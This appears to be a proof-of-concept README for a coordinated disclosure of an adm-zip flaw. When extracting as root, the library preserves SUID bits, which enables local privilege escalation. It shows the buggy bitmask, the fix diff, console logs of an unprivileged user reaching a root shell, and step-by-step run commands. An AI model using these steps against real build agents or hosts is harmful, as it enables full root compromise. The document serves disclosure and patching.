# CVE-2026-102282: adm-zip Local Privilege Escalation via SUID Preservation

[![CVE](https://img.shields.io/badge/CVE-2026--102282-red.svg)](https://www.cve.org/CVERecord?id=CVE-2026-102282)
[![GHSA](https://img.shields.io/badge/GHSA-679w--jf3m--wh39-orange.svg)](https://github.com/cthackers/adm-zip/security/advisories/GHSA-679w-jf3m-wh39)
[![CVSS](https://img.shields.io/badge/CVSS%203.1-7.1%20High-critical.svg)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

## Description

`adm-zip` is an established, pure-JavaScript ZIP archive library for Node.js with over 20 million weekly downloads across the npm ecosystem. It is widely integrated into CI/CD pipelines, container build workflows, cloud deployment tools, and server-side applications to handle archive compression and extraction.

During extraction, `adm-zip` supports a `keepOriginalPermission` configuration option intended to restore POSIX permissions recorded in the archive. However, the library failed to filter out special privilege-bearing Unix file mode bits: SUID (`S_ISUID`, `0o4000`), SGID (`S_ISGID`, `0o2000`), and the sticky bit (`S_ISVTX`, `0o1000`).

When an application extracts an untrusted ZIP archive with `keepOriginalPermission = true` while running with elevated privileges (such as a root-level CI runner, Docker container entrypoint, or backend task daemon), `adm-zip` applies the attacker-specified SUID/SGID bits to disk via `fs.chmodSync()`. This creates a root-owned SUID executable on the host filesystem, allowing an unprivileged local user to execute the binary and gain immediate root privileges.

## Affected Versions

* Vulnerable: `adm-zip >= 0.5.10, <= 0.6.0`
* Patched: `adm-zip >= 0.6.1`

## The Bug

In the PKWARE ZIP format specification, Unix file permissions are stored in the 32-bit `external file attributes` field of the Central Directory Header (bytes 38–41). On Unix-compatible archives, the upper 16 bits encode the file type and the 12-bit POSIX permission mode (`0o7777`).

In versions `<= 0.6.0`, `headers/entryHeader.js` used a 12-bit bitmask (`0xfff`):

```javascript
// headers/entryHeader.js
get fileAttr() {
    return (_attr || 0) >> 16 & 0xfff;
}
```

The bitmask `0xfff` (binary `1111 1111 1111`) extracts the entire lower 12 bits, preserving not only standard read/write/execute permissions (`0o777`), but also the special permission bits `0o4000` (SUID), `0o2000` (SGID), and `0o1000` (Sticky).

### Fix

In version `0.6.1`, the mask was clamped to `0o777` (`511` decimal), stripping all special privilege bits:

```diff
  get fileAttr() {
-     return (_attr || 0) >> 16 & 0xfff;
+     return (_attr || 0) >> 16 & 0o777;
  }
```

## The Trigger

The issue triggers when `keepOriginalPermission` is enabled during extraction:

```javascript
// adm-zip.js
const fileAttr = keepOriginalPermission ? entry.header.fileAttr : undefined;
filetools.writeToFile(entryName, content, overwrite, fileAttr);
```

In `util/utils.js`, the extracted attribute was passed directly to the filesystem without validation:

```javascript
// util/utils.js
self.fs.chmodSync(path, attr || 0o666);
```

When the extracting process runs as `root` (euid 0) on a filesystem mounted without `nosuid`, `fs.chmodSync()` sets the extracted file permissions to mode `0o4755` (`-rwsr-xr-x`) owned by `root:root`.

## Execution Logs

### Vulnerable Version (`adm-zip@0.6.0`)

Archive creation and privileged extraction:

```console
$ g++ -O2 Verify.cpp -o Verify
$ node BuildZip.js Verify exploit.zip tools/helper
Generated: exploit.zip -> tools/helper (mode 0o104755)

$ sudo node Extract.js exploit.zip /var/local/poc_out
Extracted exploit.zip into /var/local/poc_out

$ stat -c "%a %A %U:%G" /var/local/poc_out/tools/helper
4755 -rwsr-xr-x root:root
```

Execution by an unprivileged local user (`uid=1000`):

```console
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

$ /var/local/poc_out/tools/helper
[*] Real UID: 1000, Effective UID: 0
[+] SUID preserved. Escalating to root.
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Patched Version (`adm-zip@0.6.1`)

```console
$ sudo node Extract.js exploit.zip /var/local/poc_out_patched
Extracted exploit.zip into /var/local/poc_out_patched

$ stat -c "%a %A %U:%G" /var/local/poc_out_patched/tools/helper
755 -rwxr-xr-x root:root

$ /var/local/poc_out_patched/tools/helper
[*] Real UID: 1000, Effective UID: 1000
[-] Normal execution context (unprivileged).
```

## Impact

Local Privilege Escalation (CWE-732). In environments where untrusted ZIP files are processed with elevated privileges—such as automated build agents, shared hosting environments, serverless container initialization routines, and plugin installation frameworks—an unprivileged user can supply a crafted archive to plant an arbitrary root-owned SUID binary, achieving full root compromise on the host.

## How to Run

1. Build the verification binary and package the crafted archive:

```bash
cd adm-zip_lpe
g++ -O2 Verify.cpp -o Verify
node BuildZip.js Verify exploit.zip tools/helper
```

2. Extract as root using a vulnerable `adm-zip` version:

```bash
npm install adm-zip@0.6.0
sudo node Extract.js exploit.zip /var/tmp/poc_out
```

3. Confirm the SUID bit on disk:

```bash
stat -c "%a %A %U:%G" /var/tmp/poc_out/tools/helper
# Output: 4755 -rwsr-xr-x root:root
```

4. Execute as an unprivileged user:

```bash
/var/tmp/poc_out/tools/helper
```

*Note: The target extraction directory must reside on a filesystem mounted without `nosuid`.*

## Security Advisory Record

* **CVE ID:** [CVE-2026-102282](https://www.cve.org/CVERecord?id=CVE-2026-102282)
* **GitHub Advisory:** [GHSA-679w-jf3m-wh39](https://github.com/cthackers/adm-zip/security/advisories/GHSA-679w-jf3m-wh39)
* **NVD Entry:** [NVD Detail](https://nvd.nist.gov/vuln/detail/CVE-2026-102282)
* **Discoverer / Credit:** Zakariae Tafjouti (@x86byte)
* **Severity:** High (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` - Base Score 7.1)
* **Classification:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
* **Release Status:** Coordinated disclosure, patched in upstream release `0.6.1`
